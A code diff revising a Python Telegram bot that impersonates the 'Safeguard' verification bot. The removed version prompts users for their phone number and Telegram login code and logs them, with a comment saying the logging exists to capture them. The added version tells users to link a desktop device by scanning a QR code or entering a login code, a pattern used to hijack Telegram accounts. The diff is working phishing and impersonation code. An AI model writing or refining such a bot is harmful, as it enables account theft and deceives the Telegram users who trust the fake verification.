@@ -1,24 +1,20 @@
 import os
 import logging
-import random
 from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, ConversationHandler, CallbackQueryHandler
 from telegram import ReplyKeyboardMarkup, ReplyKeyboardRemove, InlineKeyboardButton, InlineKeyboardMarkup
 
-# Set up logging to capture phone numbers and codes
+# Set up logging to capture user interactions
 logging.basicConfig(format='%(asctime)s - %(message)s', level=logging.INFO)
 logger = logging.getLogger(__name__)
 
 # States for the conversation
-PHONE, CODE = range(2)
+VERIFY = range(1)
 
 # Start command
 def start(update, context):
-    # Initial message mimicking the Safeguard bot UI
+    # Initial message mimicking the new UI
     welcome_message = (
-        "What can this bot do?\n"
-        "THE MOST EXTENSIVE SECURITY AND BUY TRACKING PLATFORM ON TELEGRAM\n\n"
-        "POWERING @MySafeguardGroup\n"
-        "ANNOUNCEMENTS: @MySafeguardBot"
+        "Verify you're human with Safeguard Protection"
     )
     # Create a "Start" button
     keyboard = [[InlineKeyboardButton("START", callback_data='start_verification')]]
@@ -31,81 +27,56 @@ def button_callback(update, context):
     query = update.callback_query
     query.answer()
     if query.data == 'start_verification':
-        # Prompt for verification
+        # Prompt for human verification
         query.message.reply_text(
-            "SAFEGUARD PORTAL AUTHENTICATION REQUIRED\n\n"
-            "VERIFICATION THROUGH THE SAFEGUARD PORTAL REQUIRED. PLEASE USE THE PORTAL TO COMPLETE YOUR VERIFICATION.",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Tap to Verify", callback_data='verify')]])
+            "🔒 *Human Verification*\n"
+            "Verify below to be granted entry",
+            parse_mode='Markdown',
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Click here", callback_data='verify')]])
         )
 
-# Handle the "Tap to Verify" button
+# Handle the "Click here" button
 def verify_callback(update, context):
     query = update.callback_query
     query.answer()
     if query.data == 'verify':
-        # Prompt for phone number
-        query.message.reply_text(
-            "🔒 *MANUAL VERIFICATION*\n"
-            "Verify your User Authenticity Below\n"
-            "Powered By: @MySafeguardBot\n\n"
-            "📱 *Enter PHONE NUMBER:*",
-            parse_mode='Markdown',
-            reply_markup=ReplyKeyboardRemove()
+        # Prompt the user to log in via QR code or login code
+        qr_message = (
+            "🔒 *Human Verification*\n\n"
+            "To verify, please log in to Telegram on another device:\n"
+            "1. Open Telegram on your phone\n"
+            "2. Go to Settings > Devices > Link Desktop Device\n"
+            "3. Scan the QR code or enter the login code sent to your Telegram account\n\n"
+            "Once you’ve logged in, click 'I have logged in' below."
         )
-        return PHONE
+        keyboard = [[InlineKeyboardButton("I have logged in", callback_data='confirm_login')]]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        query.message.reply_text(qr_message, parse_mode='Markdown', reply_markup=reply_markup)
+        return VERIFY
 
-# Handle phone number input
-def phone(update, context):
-    user = update.message.from_user
-    phone_number = update.message.text
-    context.user_data['phone'] = phone_number
+# Handle the "I have logged in" button
+def confirm_login_callback(update, context):
+    query = update.callback_query
+    query.answer()
+    if query.data == 'confirm_login':
+        user = query.from_user
+        # Log the user who completed verification
+        logger.info(f"User {user.id} completed verification")
 
-    # Log the phone number
-    logger.info(f"User {user.id} entered phone number: {phone_number}")
-
-    # Generate a random 4-digit code (simulating Telegram's code)
-    verification_code = str(random.randint(1000, 9999))
-    context.user_data['code'] = verification_code
-
-    # Log the generated code
-    logger.info(f"Verification code for user {user.id}: {verification_code}")
-
-    # Simulate sending the code via Telegram (in a real scenario, Telegram would send this)
-    update.message.reply_text(
-        f"🔒 *MANUAL VERIFICATION*\n"
-        "Verify your User Authenticity Below\n"
-        "Powered By: @MySafeguardBot\n\n"
-        "📩 A code has been sent to your Telegram account.\n\n"
-        "🔑 *ENTER CODE TELEGRAM CODE:*\n"
-        f"(For this demo, the code is: {verification_code})",
-        parse_mode='Markdown'
-    )
-    return CODE
-
-# Handle code input
-def code(update, context):
-    user = update.message.from_user
-    entered_code = update.message.text
-
-    # Log the entered code
-    logger.info(f"User {user.id} entered code: {entered_code}")
-
-    correct_code = context.user_data.get('code')
-    if entered_code == correct_code:
         # Generate a temporary invite link for the group
         group_id = os.environ.get('GROUP_ID')
         if not group_id:
             logger.error("GROUP_ID not set in environment variables.")
-            update.message.reply_text("Verification successful, but GROUP_ID is not set. Please contact the admin.")
+            query.message.reply_text("Verification completed, but GROUP_ID is not set. Please contact the admin.")
             return ConversationHandler.END
 
         try:
-            invite_link = update.message.bot.create_chat_invite_link(
+            invite_link = query.message.bot.create_chat_invite_link(
                 chat_id=group_id,
-                expire_date=int(update.message.date.timestamp()) + 3600,  # Link expires in 1 hour
+                expire_date=int(query.message.date.timestamp()) + 3600,  # Link expires in 1 hour
                 member_limit=1  # Single-use link
             ).invite_link
-            update.message.reply_text(
+            query.message.reply_text(
                 "✅ *Verification successful!*\n\n"
                 "You can now join the group using the link below:\n"
                 f"{invite_link}",
@@ -113,16 +84,9 @@ def code(update, context):
             )
         except Exception as e:
             logger.error(f"Failed to generate invite link: {e}")
-            update.message.reply_text("Verification successful, but failed to generate the invite link. Please contact the admin.")
-    else:
-        update.message.reply_text(
-            "❌ *Incorrect code. Please try again.*\n\n"
-            "🔑 *ENTER CODE TELEGRAM CODE:*",
-            parse_mode='Markdown'
-        )
-        return CODE
+            query.message.reply_text("Verification completed, but failed to generate the invite link. Please contact the admin.")
 
-    return ConversationHandler.END
+        return ConversationHandler.END
 
 # Cancel command
 def cancel(update, context):
@@ -149,11 +113,11 @@ def main():
         entry_points=[
             CommandHandler('start', start),
             CallbackQueryHandler(button_callback, pattern='start_verification'),
-            CallbackQueryHandler(verify_callback, pattern='verify')
+            CallbackQueryHandler(verify_callback, pattern='verify'),
+            CallbackQueryHandler(confirm_login_callback, pattern='confirm_login')
         ],
         states={
-            PHONE: [MessageHandler(Filters.text & ~Filters.command, phone)],
-            CODE: [MessageHandler(Filters.text & ~Filters.command, code)]
+            VERIFY: [CallbackQueryHandler(confirm_login_callback, pattern='confirm_login')]
         },
         fallbacks=[CommandHandler('cancel', cancel)]
     )
